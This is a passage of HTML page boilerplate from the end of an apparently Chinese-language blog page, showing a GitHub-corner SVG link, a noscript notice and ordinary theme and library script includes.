target=_blank rel="external nofollow" class="github-corner left d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true" width="56" height="56"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentColor" class="octo-body"/></svg></a><div id=mask></div><noscript><div class=noscript-warning>该网站在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=stylesheet href=/lib/pace/themes/blue/pace-theme-minimal.css><script src=/lib/autocomplete/autocomplete.min.js defer></script><script src=/lib/fuse/fuse.min.js defer></script><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/cell-watermark/watermark.min.js defer></script><script src=https://vercount.one/js async defer></script><script src=/lib/pace/pace.min.js async defer></script><script src=/posts/5422d65/config/page.js defer></script><script src=/js/theme.min.js defer></script></body></html>